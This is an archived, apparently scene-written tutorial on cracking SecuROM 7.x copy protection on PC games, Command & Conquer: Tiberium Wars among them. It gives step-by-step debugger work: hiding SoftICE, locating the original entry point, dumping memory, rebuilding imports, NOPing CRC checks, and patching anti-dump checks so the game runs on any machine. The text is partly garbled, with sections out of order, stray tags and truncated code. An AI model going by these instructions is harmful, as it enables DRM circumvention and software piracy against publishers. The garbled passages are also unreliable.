<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_24.PNG" alt="securom_backup_24"></p>
<h3 id="5-Fourth-Step-daemons-tools-and-OEP"><a href="#5-Fourth-Step-daemons-tools-and-OEP" title="5. Fourth Step: daemons tools and OEP"></a>5. Fourth Step: daemons tools and OEP</h3><ol>
<li><p>Lets load maxi image into daemon tools 4.10 </p>
</li>
<li><p>Run Yasu to cloak virtual drives </p>
</li>
</ol>
<blockquote>
<p>Archiver’s Note: Don’t bother using YASU, just use SecuROM Loader 1.2.</p>
</blockquote>
<ol start="4">
<li><p>Set break point on <code>CreateProcessInternalA</code> and run, after break you will see  on stack param to use with oepfind, so lets use it. </p>
</li>
<li><p>For me command to run In Total commander is like this: </p>
<p> oep game.exe /Sonydadc /05f0612d /05f0612d /220792E1 /1</p>
</li>
</ol>
<p>Last param is time in ms, antidebug that spawns another instance of exe and kills parent if difference is too high from current GetTickCount. But due we patch GetTickCount to count slower in rate of +1, we use /1 instead of original time </p>
<p>With oepfind we use these settings: </p>
<ul>
<li>kill low Alloc so it will not Alloc Any memory under imagebase </li>
<li>hook virtualalloc to Alloc memory linear not random </li>
<li><p>GetTickCount +1 to disable spawn of another proper process </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_25.PNG" alt="securom_backup_25"></p>
</li>
</ul>
<p>Now Press detach to look for OEP. After about 10 seconds we have: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_26.PNG" alt="securom_backup_26"></p>
<p>Fine so Press yes or Any key In your language. Run Olly and attach to our game.exe. Remember PID due we will need it later, mine is here 75C </p>
<p>Don’t run just in menu select view/threads and double click that one suspended. </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_27.PNG" alt="securom_backup_27"></p>
<p>Like you can see we are AT OEP :) </p>
<p>Press OK In oepfind to remove infinite jump. But dont close it yet!!</p>
<p>Again we must Press alt+M and change .securom section axx rights to full so right click on it and do Set Access/Full Access Now it’s time to dump memory regions I know it’s a lot of memory but I’m too lazy to code proper memory manager. As you can see our memory starts at 0x6130000 </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_28.PNG" alt="securom_backup_28"></p>
<p>And ends at 94CF000+1000 so its 94D0000 (last region that doesn’t show Any file name, here last before d3dx9_30.dll). Let put those into oepfind to Fields that are now not grayed out. </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_29.PNG" alt="securom_backup_29"></p>
<p>Press dump and in your dir you’ll find a file named DUMP_06130000-094D0000 of 54mb, with all the dumped range. Now you can close oepfind. </p>
<h3 id="6-Fifth-Step-Fixing-Anti-dumps"><a href="#6-Fifth-Step-Fixing-Anti-dumps" title="6. Fifth Step: Fixing Anti-dumps"></a>6. Fifth Step: Fixing Anti-dumps</h3><p>Now we are ready to dump exe, but before that we must do one thing. Another securom protection is left. Securom uses also EP as antidump. So when ollydump change now EP to OEP we will be screwed. Securom adds return params from many Apis to address. So when for example original PID is 200 and dumped program’s PID is 100, we have 200-100+address gets wrong data and end with a page fault. So it always should be 0, when both are same. </p>
<p>Ok, then back to our EP, what to do? Simply move the header somewhere else. Select all from 400140 till 400300 do binary copy and binary paste it to 4001C0 </p>
<p>Then we change 40 to C0 at 40003C to point to a new place. </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_30.PNG" alt="securom_backup_30"></p>
<p>Now we can dump our exe with unticked rebuild imports. </p>
<p>As you can see exe is 97Mb, biohazard exe without securom is Just 6Mb, that’s how protections hurt customers, not my fault then. </p>
<p>Next step will be to fix imports and add our regions. So let fire up CFF Explorer (I patched mine due I was pissed with asking should I load more than fucked 20MB, what a dumb question today, when minimum memory is 2GB). </p>
<p>Click section headers and right click to do “Add Section (file data)” to add our dumped regions. </p>
<p>Fix virtual address with start address-imagebase 6130000400000=5D30000 and change section rights to E0000020 </p>

<p>Do right click, rebuild image size, header and save exe. </p>
<p>Now fix imports, well we don’t need imprec all we need is into the .idata section. Run Winhex with game.exe and press alt+G now go to 66b000 can you see those addresses? So copy those till API names. </p>
<p>Close it and now run Winhex on dump.exe, press alt+G and go to 53E8000, now Ctrl+B to paste our IAT, that now as you can see is not RVA, only 7Cxxxxxx. Save the exe and rebuild from the beginning. After the rebuild we will again paste IAT due from Olly we will dump exe again with API addresses changed from RVA to 7Cxxxxxx. </p>
<h3 id="7-Sixth-Step-fixing-the-CRCChecks"><a href="#7-Sixth-Step-fixing-the-CRCChecks" title="7. Sixth Step: fixing the CRCChecks"></a>7. Sixth Step: fixing the CRCChecks</h3><p>Till now we dumped the exe, fixed the IAT and the PE header, and added missing file regions. We can start with fixing rest. </p>
<p>We start with fixing CRCchecks, for this we will use my Securom 7.x CRC Check Fixer.txt script (included in goodies folder of this distribution). CRCchecks comes in 2 flavours: memory and register. Memory CRC updates always some address [esp+xx] and later uses it, other type updates one of registers eax,ebx,ecx etc. </p>
<p>So what this script does? It searches for patterns of CRCcheck and sets an HW breakpoint, after calculation loop it replaces everything with nops and paste there just calculated value that will be then hardcoded. </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_32.PNG" alt="securom_backup_32"></p>
<p>Like you can see 057EE02D ADD DWORD PTR SS:[ESP+14],EDI. This is the place of our fix. (I noticed that, and really don’t know why, odbgscript runs faster when I have some some movie in background, open but stopped). </p>
<p>It takes a lot of time even on my Intel C2D E6700 (with a movie stopped it runs 4x faster :P). Anyway the homework this script does is really huge, it has to fix more than 100.000 locations. The works is done into a temporary memory buffer: CRCchecks calc CRCs using their own native loops, after this the temp buffer is copied back into sections substituting the CrCCheck just executed. Minimizing Olly window also speeds up because Windows doesn’t redraw all. </p>
<p>A result of the script is shown here: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_33.PNG" alt="securom_backup_33"></p>
<p>Like you can see in above figure, ESP+14 updates always to 164E, and log shows script took 724983ms so 12 minutes :P </p>
<p>Don’t alter script, it will not be faster, I already optimized it to max. Even direct write of opcodes as bytes is faster than assembling new instruction. CRCcheck pattern is in 2 sections, so both those are In script. </p>
<ol start="8">
<li>Seventh Step: taking care of antidumps </li>
</ol>
<p>Now its time to take care of antidump APIs.  In this version securom uses the following: </p>
<ul>
<li>GetCurrentProcessId: every process gets PID but to make it work, dump needs to return PID as original process </li>
<li>GetVersion: every windows have own version, so to make it work on vista but dumped on xp we need to return xp version </li>
<li>CPUID: every CPU have own ID returned in eax &amp; edx, so to make it work on other CPUs it has to return the ID stored in the dump, ours then. </li>
<li>ResetEvent:  every securom exe creates event or events, dump doesn’t have them so we need to return 1 </li>
<li>GetComputerNameA: every pc has a name, so other pc must match what we store into the dump </li>
<li>GetUserNameA: every user logged has a name, other user logged and it crashes, so same applies here </li>
<li>RtlGetLastWin32Error: here again we need to return 1, in case there are errors we tell there aren’t any </li>
<li>GetSystemInfo: every pc has own 20 bytes System info table returned, again it must match our </li>
</ul>
<p>Knowing all this we can start patching securom. For this we need a place, I choose 9BFF00. And that’s how it will look: </p>

<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_34.PNG" alt="securom_backup_34"></p>
<p>Lets see what’s inside CALL DWORD PTR DS:[5EA4634]? </p>
<pre><code>05A66760    FF15 7CBAD705           CALL DWORD PTR DS:[5D7BA7C]             ; kernel32.GetCurrentProcessId

05A6676A    C2 0400                 RETN 4 
</code></pre><p>This code wants our PID, and later adds value pushed on stack to it. That’s why we should have here: </p>
<pre><code>MOV EAX,75C                       ; is my PID of securom process that I dumped ADD EAX,DWORD PTR SS:[ESP+4] RETN 4 
</code></pre><p>Now get back out of it. Do you see this? </p>
<pre><code>05A61A7A    50                      PUSH EAX 
05A61A7B    FF15 3446EA05           CALL DWORD PTR DS:[5EA4634]                 ; b.05A66760

05A61A86    3305 3446EA05           XOR EAX,DWORD PTR DS:[5EA4634]              ; b.05A66760 
</code></pre><p>Tricky, it does a XOR on EAX, with the address of this small code part and then does again a XOR with the address of small code part that is held in [5EA4634] so we can’t change address for our patch. But hey just change 2nd  XOR to same as 1st  one, 2 chained XORs with same value will give us 0 so EAX will not change. Same trick we will do on other below, and under [5EA4634] we will now put 9BFF00 for our patch. </p>
<p>One done few more to go. </p>
<p>What have we in 05A61A92 CALL DWORD PTR DS:[5EA4638] ? </p>

</code></pre><p>It’s better to not touch addresses and opcodes due securom also uses those as encryption, when it calculates some value in EAX or other register it likes to do ROL with value of some memory. </p>
<p>For example from  </p>

5046EA05           CALL DWORD PTR DS:[5EA4650]

<pre><code>ROL EAX,[05A61B34] 
</code></pre><p> so it does ROL EAX, 50 when we change address in that call then encryption is screwed. </p>

</code></pre><p>So as I said we must return 1, assemble just there a MOV EAX,1 and RET and all is fine. </p>
<p>You can now ask why not change call to 05AE0BF2 into MOV EAX,1 it’s also 5 bytes? Well, because I bet that E8 from call is used as ROL in some place. I have already seen that in older securom when I tried to fix E8 call that leads to some winapi to point to my IAT table jump. </p>
<p>Well its not over yet with RtlGetLastWin32Error! Why? </p>
<p>Lets look at: </p>
<pre><code>05ADC7DA    8B48 14                 MOV ECX,DWORD PTR DS:[EAX+14] 
05ADC7E9    8948 14                 MOV DWORD PTR DS:[EAX+14],ECX 
</code></pre><p>When we return 1 and add 14 then we have 15 (lol I’m so good at math :P, but I still don’t know how much is 2*2 :P) and when those two execute then we get page fault :( So only possible way is to NOP those two and all is fine. </p>
<p>Next step is: </p>

<pre><code>MOV EAX, 75C    ;my PID
</code></pre><p>And we are almost home. When you now run exe it will work, but only on your machine, but goal is to make it run on any other. </p>
<p>Now after we patched all antidump apis run this script: Securom 7.x Jump Bridge &amp; Crypted Code Fixer.txt (included into goodies folder). </p>
<p>Do you see it? And where it goes? </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_35.PNG" alt="securom_backup_35"></p>
<p>What here script does it will set HWBP on write into that DWORD when securom will update it with new address. That’s how it looks now: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_36.PNG" alt="securom_backup_36"></p>
<p>Well after write it looks like it: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_37.PNG" alt="securom_backup_37"><br>And destination looks like it:<br> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_38.PNG" alt="securom_backup_38"></p>
<p>Well at this point we could finish and go to next jump bridge, but as you can see I have in script now HWBP on execute. It’s not needed here, just to make loop universal for crypted code, instead of code splicing or virtualized code by securom it can lead to crypted code. That we must execute on our machine to decrypt it, due inside there is crypted CPUID check and will not uncrypt on other CPU just crash. So let analyze another jump bridge: </p>
<pre><code>004DDD50  - FF25 54E40606           JMP DWORD PTR DS:[606E454]                  ; b.06073A10 
</code></pre><p>That leads us to: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_39.PNG" alt="securom_backup_39"></p>
<p>You see that call? Its call to decrypted code at and after address of that call, so after execute and HWBP on execute on 4DDD50 we get: </p>
<p>Nice uncrypted code that will stay same after we again dump and run on any other machine, due no more checks there. Run whole script to achive that. Again 54890ms (only asm can make it faster) </p>
<p>And now last part to fix is CPUID checks that can be in spliced code. </p>
<p>  <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_40.PNG" alt="securom_backup_40"></p>
<p>Run Securom 7.x Cpuid Fixer.txt to fix all those (included into the goodies folder of this tutorials original package): </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_41.PNG" alt="securom_backup_41"></p>
<p>What script does is to search for CPUID and checks if there is an instruction like “and eax,FFFFFFDF”, just after the CPUID also there can be EB jump to “and eax,FFFFFFDF”, so we must also handle it. Simplest way to fix it is to replace “and eax,FFFFFFDF” with a “mov eax,6D6” that is my CPUID after and’ing. Script gets your CPUID automatically so you don’t need to modify it. </p>
<ol start="9">
<li>Conclusions </li>
</ol>
<p>Finally we are at end and can now dump and again fix IAT with Winhex. It should run now on any pc we like. Of course you can dump just once at end, but I did this few times due its better for me to write this tut and get pictures of code so I could paste them here. I hope you enjoyed it and learned something. </p>

Forewords"></a>1. Forewords</h3><p>SecuROM is a famous protection used by many games nowadays. Funny thing is that it’s cracking doesn’t take too much time, only takes time when you are doing it for the first time, after that it goes flowless. There aren’t tutorials about SecuROM in the public as far as I’m aware. First tutorial which deals with SecuROM 7.xx was submitted to ARTeam by AnonymouS author, so I think we should write more about it, just for fun…  </p>
<h3 id="2-Tools-and-Target"><a href="#2-Tools-and-Target" title="2. Tools and Target"></a>2. Tools and Target</h3><p>Target that we will be using is Command &amp; Conquer : Tiberium Wars v1.0, so you will need to get that DVD to follow this tut. </p>
<blockquote>
<p>Archive Note: The method of inspecting the ASS is the same here as for other SecuROM 7.xx games.</p>
</blockquote>
<p>Well any SecuROM will work as approach is kinda generic. </p>
<p><strong>Tools:</strong></p>
<ul>
<li>SoftICE </li>
<li>Olly only for kewl screenshots… </li>
<li>IDA </li>
<li>Asm/C compiler </li>
</ul>
<p>Also make sure that you have original DVD as game developers deserve money for their work… </p>
<p>To run this game you will have to copy cnc3game.dat from RetailExe\1.0 to folder where is located cnc3.exe and simply type: </p>
<pre><code>cnc3game.dat –win –config  CNC3_english_1.0.SkuDef 
</code></pre><p><em>-win is for windowed mode </em></p>
<p>Of course, you don’t have to do this while you are unpacking protection, it is only required when you are testing your dump, otherwise you will get this message if you run dump without that command line: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_42.PNG" alt="securom_backup_42"></p>
<p>Similar output you will get when your dumped file is started without proper command line.  </p>
<h3 id="3-Few-words-about-SecuROM"><a href="#3-Few-words-about-SecuROM" title="3. Few words about SecuROM"></a>3. Few words about SecuROM</h3><p>SecuROM protection consists of one .exe attached to original .exe. If you trace a little bit trough SecuROM layer you will see 2nd exe being appended, even standards MSVC initialization routine are held in this upper layer. If you want you may dump at this layer and analyze securom protection, but that is not very important for us atm. </p>
<p>SecuROM uses a lot of buffers to make itself anti-dump which are always allocated on different base addresses which leads us to simple conclusion that some kind of random generator is used to allocate those buffers. Also SecuROM uses several anti-dump tricks such as GetCurrentProcessId, OpenEventA/CloseHandle, ResetEvent, TlsSet/GetValue, entrypoint address, imagesize from PE header etc… which we can patch of course. </p>
<p>It allocates a lots of buffers to execute its code and when dumped those buffers take ~40mb. Luckily when compressed they take around 1MB or less, as all redirections are allocated at 64K boundary but only 1KB is commited. This is result of calling VirtualAlloc a lots of times (try making infinite loop with VirtualAlloc and watch what happens). Thus 64K-1K is padded with zeros in your dump and giving really really good compression ratio.  Just for comparison, I have dump of 70MB compressed back to 7MB, well, almost like virgin file  Well I’ll also discuss about making this dump smaller : virgin + ~20mb. </p>
<p>Before we even think to fire up SoftICE with SecuROM protection we have to hide it properly, well, my softice is hidden it this way: </p>
<pre><code>- NtCreateFile - Int1/int3/int41 patched - NtQuerySystemInformation - UnhandledExceptionFilter 
</code></pre><p>One more way remains to detect SoftICE and that’s to query it’s service and check if it is active, for this I use hook of OpenServiceA to eliminate NTICE service opening. This hook code and other stuff used to log SecuROM execution may be found in hookdll.c. Also SoftICE activity can be detected with EnumServicesStatusExA which is used by ActiveMARK but that’s another story. </p>
<h3 id="4-Dumping-SecuROM"><a href="#4-Dumping-SecuROM" title="4. Dumping SecuROM"></a>4. Dumping SecuROM</h3><p>There are a few ways to dump SecuROM at the OEP: </p>
<ul>
<li>Use method described by anonymous author [see first chapter of this document] </li>
<li>Find vm_exit, hook it, and wait when it jumps back to 1st section </li>
<li>Hook commonly used APIs at MSVC oep and watch when those are called from 1st section </li>
<li>Just dump .exe, load it in IDA, and apply MSVC signatures, then search for OEP </li>
<li>Use PAGE_GUARD to find when code section jmp to oep </li>
</ul>
<p>Well there are several ways as you may see, but it is upto you to find method which fits your needs the best. </p>
<p>OEP in this target is located at: 0x40A1B3 </p>

</code></pre><p>When dumping SecuROM you have to know that it’s PE header in memory is actually PE header of a virgin file (except AddressOfEntryPoint is foobared and used as anti-dump on several places). </p>
<p>As we know this fact we may write dumper for SecuROM and dump virgin file to the disk. You may see sromd.asm for detailed code (nothing special just read PE header from memory and dump image to disk + add extra section for SecuROM sections). </p>
<p>SecuROM uses jmp to execute some stolen procedures which are mixed with SecuROM code. To find such procedure you won’t have to search much, first call in OEP leads us to SecuROM code: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_43.PNG" alt="securom_backup_43"></p>
<p>This jmp only first time will take you to SecuROM virtual buffers: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_44.PNG" alt="securom_backup_44"></p>
<p>If you keep traceing trough it you will eventually end up here:  </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_45.PNG" alt="securom_backup_45"></p>
<p>Now look, it will take you to stolen and mixed procedure here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_46.PNG" alt="securom_backup_46"></p>
<p>You may see how this procedure is mixed with addresses from .securom section, and some jccs are leading to that section. If we take one step back and look  again at the jmp from which we have started to trace, we may see that SecuROM wrote to jmp dword ptr[] correct address: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_47.PNG" alt="securom_backup_47"></p>
<p>Note address in 2nd column, it is same as address of stolen procedure. There are at least 2 reasons why this is done in such way: </p>
<ol>
<li>Numerous execution of same procedure would slow down game execution </li>
<li>Make code anti-dump as you may not simply dump it without fixing those jmps </li>
</ol>
<p>Those jmp dword ptr[] can be easily found by using byte search, thus, you will either have to write your own tool, or use olly scripts to do the job for you. Before we even dump file, we have to fix those jmps, and for that I use srom_logger.exe and vmtrace.dll. </p>
<p>Srom_logger.exe is very simple search engine which searches for jmp dword ptr[] and checks if they are leading us to .securom section. If such jmp is found, loader is injected into remote process which will be responsible for loading vmtrace.dll and calling it’s export vmtrace!tracer. </p>

</code></pre><p>You would probably wonder why I am using ReadProcessMemory to read address from my own process. Well trick is simple, as I used HWBP on r/w each read from r3 would cause HWBP to generate exception, even when you are reading from exception handler, now as code is rewritten to use HWBP on write this is not needed anymore. Also you may see that I’m setting HWBP on execution on final destination. This is done to avoid wrong identification of destination when SecuROM writes 2 times to this address. Whenever write there occurs we take that address and HWBP on execution on that address. When dr1 is hit (execution HWBP) we know we have good pointer, and we log it. </p>
<p>Also it will occur that procedures are in virtual memory so we dump that too to the disk which will allow us to fix them easily. Also srom_logger.asm will produce log file which will look something like this: </p>
<pre><code>redirection at 0x00401023 to 0x013D34C3 
redirection at 0x00401098 to 0x013F11F8 
redirection at 0x004010C5 to 0x013F66A5 
redirection at 0x00401103 to 0x00434D33 
redirection at 0x00401141 to 0x0044D2F1 
redirection at 0x0040116F to 0x013EA3CF 
redirection at 0x004011AD to 0x013F2BBD 
</code></pre><p>There is 2957 those jmps so we need to automate process of fixing. Also regions with procedures are dumped to the disk for later fixing (again in another tool named sfixer.asm). Note that after you run srom_logger.asm you will have fixed jmp dword ptr[] in your target in memory so this is the point when you dump it to the disk with fixed jmps. </p>
<p>Here is an example of one stolen procedure stored somewhere in virtual memory: </p>
<pre><code>seg000:03A5000B                 push    esi 
seg000:03A5000C                 mov     esi, [esp+8] 
seg000:03A50010                 jmp     short loc_3A5002A 
seg000:03A50012 
seg000:03A50012 loc_3A50012: 
seg000:03A50012                 mov     ecx, esi 
seg000:03A50014                 push    offset loc_3A50027 
seg000:03A50019                 push    7FE20Fh 
seg000:03A5001E                 retn

seg000:03A50031                 retn 
</code></pre><p>You can’t put it back to its original place as SecuROM uses that space in code section for other anti-dump tricks. </p>
<p>We are almost close to dumping this target.</p>
<p>Next thing we should know is where are all virtual buffers that we have to dump and append. For this purpose I use hookdll.c which can be used with my Ultimate Hooking Engine [1]. Also it is recommended to use hook of rdtsc to avoid randomness in memory allocation. </p>
<p>Oki, inject hookdll.dll into target by typing: hook cnc3game.dat, and after a few seconds you will be greeted with MessageBoxA similar to this one on the picture: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_48.PNG" alt="securom_backup_48"></p>
<p>Write down those memory addresses, and press ok. Your target will be in the infinite loop in hook of GetTickCount. Do not attach Olly yet!!! Run srom_logger.exe and you will get output similar to this one : </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_49.PNG" alt="securom_backup_49"></p>
<p>Oki doki, we have produced 0xXXXXXXXX.dmp files and splices.bin + we have fixed jmp dword ptr[] in protected program. Now you may attach olly, or simply ctrl+d if you are using SoftICE and you will be here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_50.PNG" alt="securom_backup_50"></p>
<p>What I have done here is to check for return address in GetTickCount, and if it is called from certain location I put target into infinite loop, this giving me possibility to always break at OEP fast. You should nop out this jmp $ but do NOT run target yet, as you will need to get also TlsValue with index 0xF which is used as antidump at one point. Simply assemble this code: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_51.PNG" alt="securom_backup_51"></p>
<p>The reason why I’m doing this at this moment is to save you some time, you could easily figure this thing later on, and then you will have to dump all over again. Not letting you know at this point about this trick would be mean. Also you have to write down PID of this process!!!! </p>
<p>Now, you may see that in PE header there is valid virgin header, so you may dump it like that. I use my dumper for SecuROM which dumps that pe header from memory and image as it was before packing, and appends to it other memory occupied by SecuROM. </p>
<p>After running sromd.asm you will have dumped_securom.exe which will look like this: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_52.PNG" alt="securom_backup_52"></p>
<p> So far so good. You wrote down addresses displayed in MessageBoxA? If not go all over again. </p>
<p>Now take a closer look at spliced files dumped by srom_logger.exe: </p>
<p>Splices start: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_53.PNG" alt="securom_backup_53"></p>
<p>Splices end: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_54.PNG" alt="securom_backup_54"></p>
<p>By looking at splices we may see that those are allocated on 0x10000 boundary, but there is one small gap between all those splices located here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_55.PNG" alt="securom_backup_55"></p>
<p>Look closer and you will see that we are missing memory region between 45D0000 and 4960000. So we will have to dump that region too. </p>
<p>So far we have 2 regions which have to be dumped: </p>
<p>1480000 – 37F0000 and 45D0000 – 4960000, dump them, and use CFF explorer by Daniel Pistelli to add those regions to dumped_securom.exe. For me it looks like this: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_56.PNG" alt="securom_backup_56"></p>
<p>One more thing left to go over, and that’s to add splices, with sfixer.exe . Before you run sfixer.exe you should save splices.bin to, for example, splices_save.bin as sfixer.exe will modify this file, and if something goes wrong you won’t have this file, also you should know that sfixer.exe assumes that you are fixing file “final.exe” so copy updated dumped_securom.exe to “final.exe”. Note also that this step is NOT required, </p>
<p>you could just dump memory from heap1 to highmem from MessageBoxA but your dump would be + ~20mb. In this way, with splices fixing we are reducing dump size + we are making nicer dump. </p>
<p>After running sfixer.asm we may check some of our virtual memory redirections from log_redirection.exe (produced by srom_logger.asm): </p>
<pre><code>redirection at 0x00410BC1 to 0x03B20001   &lt;--- from log_redirections.txt 
</code></pre><p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_57.PNG" alt="securom_backup_57"></p>
<p>And fixed splice: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_58.PNG" alt="securom_backup_58"></p>
<p>I’ll also show you two splices which weren’t fixed by my tool correctly, and which I have fixed by hand (from protected game in memory): </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_59.PNG" alt="securom_backup_59"><br>From my dump: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_60.PNG" alt="securom_backup_60"></p>
<p>And when fixed by hand it should look like: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_61.PNG" alt="securom_backup_61"></p>
<p>And second splice: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_62.PNG" alt="securom_backup_62"><br>And when fixed: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_63.PNG" alt="securom_backup_63"></p>
<p>As you may see in this picture, splice is fixed, but before fixing this call was causing crash as whole splice was rebased to the new address. </p>
<p>Theoretically speaking sfixer.asm can be rewritten to follow execution flow and rebuild those procedures in better way. We may see 3 patterns used as call: </p>
<pre><code>push   &lt;ret_splice_address&gt; push   &lt;proc_address&gt; ret 

push   &lt;ret_splice_address&gt; jmp    __proc_address 

push   &lt;ret_splice_address&gt; push   dword ptr[API_pointer_from_IAT&gt; ret 
</code></pre><p>And those are only patterns which are fixed by sfixer.asm, of course, better engine could be written, but, this is good enough  </p>
<p>Voila, dumping is done now. All we have to do is to get rid of anti-dump tricks present in the SecuROM, and we will have dumped and fixed game.</p>
<h3 id="5-Anti-Dump-fixing"><a href="#5-Anti-Dump-fixing" title="5. Anti-Dump fixing"></a>5. Anti-Dump fixing</h3><p>This is part where your head might start hurting a little bit, so my advice is to grab pen and paper and write your observation. Well at least that’s how I do with all protectors. </p>
<p>First anti-dump that you will see is when you enter into SecuROM vm interpreter. I don’t want to trouble you mutch so here is address to be hit first: </p>
<pre><code>.bla:00CBEC00 sub_CBEC00      proc near                
.bla:00CBEC00                 jmp     ds:dword_125D9EC 
.bla:00CBEC00 sub_CBEC00      endp 
</code></pre><p>Depending on your dump address to which this jmp is leading could be different, but for me it is at 3320000: </p>
<pre><code>seg000:03320345                 mov     eax, large fs:18h 
seg000:0332034B                 inc     ebp 
seg000:0332034C                 db      3Eh 
seg000:0332034C                 mov     eax, [eax+30h] 
seg000:03320350                 db      3Eh 
seg000:03320350                 mov     eax, [eax+8] 
seg000:03320354                 db      3Eh 
seg000:03320354                 mov     edx, [eax+3Ch] 
seg000:03320358                 dec     ebp 
seg000:0332035A                 db      3Eh 
seg000:0332035A                   mov     edx, [edx+eax+50h] 
</code></pre><p>Here it takes OptionalHeader.SizeOfImage if you dump your target it will have different image size from the one that SecuROM expects to be there. So you will have to fix it, it is, 87A000, well simply dump target from memory with LordPE and you will see correct values. </p>
<p>Ok you need to patch it… simply patch mov edx, [edx+eax+50h] with mod edx, 87A000, and first anti-dump is defeated. Next anti dump is CPUID trick  which makes dump only CPU specific eg. It won’t work on other CPUs if you don’t fix it: </p>
<pre><code>seg000:03320305                 mov     eax, 1 
seg000:0332030A                 push    ebx 
seg000:0332030B                 add     ebp, eax 
seg000:0332030D                 cpuid 
seg000:0332030F                   and     eax, 0FFFFFFDFh 
</code></pre><p>This is relatively simple to fix, what you will do is to search trough dumped vm regions for certain byte patern: mov eax. 1. When you find it, now use lde to check if cpuid is present in next 5 instructions, if you find jmp __ follow it. When you find cpuid you know what to fix. Use again lde from cpuid offset to find and eax, 0FFFFFFDFh and patch it with mov eax, value which is returned on your CPU. </p>
<p>This search’n’replace is easy to write, so you may exercise a little bit.</p>
<p>There are 2 more anti-dumps in VM interpreter. GetCurrentProcessId and OpenEventA/CloseHandle. Trick here is to patch GetCurrentProcessId call to return PID of your dump, and OpenEventA/CloseHandle to return 1 for CloseHandle: </p>
<pre><code>seg000:028400F1                 mov     edx, [edx] 
seg000:028400F3                 xor     edx, 0CC5C4764h 
seg000:028400F9                 call    edx  &lt;-- GetCurrentProcessId 
seg000:028400FB                 and     ebp, edx 
seg000:028400FD                 mov     edx, eax 
seg000:028400FF                 sub     edx, ecx 
seg000:02840101                 btc     ebp, eax 
seg000:02840104                 pop     ecx 
</code></pre><p>So it should look something like this when patched: </p>

<p><strong><em>OpenEventA/CloseHandle:</em></strong> </p>

seg000:0286013D                 call    edx  &lt;--- CloseHandle 
</code></pre><p>You should patch this part in a smart way, first you have to patch push 2/call edx with add esp, 8 to eliminate 2nd and 3rd arguments passed to OpenEvent, now you will have to patch push eax (event handle with nop) and xor edx, 0AC86A5A7h with mov eax,1 and nop call edx (CloseHandle).  </p>
<p>Good, good, VM handlers are now anti-dump patched. </p>
<p>Let’s proceed to another anti-dump in code of SecuROM: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_65.PNG" alt="securom_backup_65"></p>
<p>Hmmm what is what here? Lets start by going to each one of them and seeing what is going on: </p>
<p>1st: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_66.PNG" alt="securom_backup_66"></p>
<p>This is GetCurrentProcessId check, which you will have to patch with mov eax, dump_pid </p>
<p>2nd: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_67.PNG" alt="securom_backup_67"></p>
<p>Check for OS version via GetVersion, so you patch it with mov eax, version_of_your_os </p>
<p>3rd check: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_68.PNG" alt="securom_backup_68"></p>
<p>Well pretty much self explanatory, patch it with value which cpuid returns on your machine </p>
<p>4th check: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_69.PNG" alt="securom_backup_69"></p>
<p>Patch this as mov eax, 1, and nop out call to ResetEvent </p>
<p>5th check: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_70.PNG" alt="securom_backup_70"></p>
<p>Hey, there is my computer name, nice. So SecuROM here checks for length of your computer name. Check line 0xFA678F and 2 lines after it is set to 0x10, which is maximum size of buffer passed to GetComputerNameA. Then at line 0xFA67BE it takes length of computer name returned by call to GetComputerName, so your patch here would be to nop out EnterCriticalSection and LeaveCriticalSection, also nop out call to GetComputerNameA and nop passing arguments to it, and assemble there mov [12F5A2C], len_of_your_computer_name , and nop je at 0xFA67AB. Easy… </p>
<p>6th check: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_71.PNG" alt="securom_backup_71"></p>
<p>And buffer: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_72.PNG" alt="securom_backup_72"></p>
<p>This buffer will simply return it’s address, so above check you should patch with:  <strong>mov eax, 4650000</strong> </p>
<p>7th check: </p>
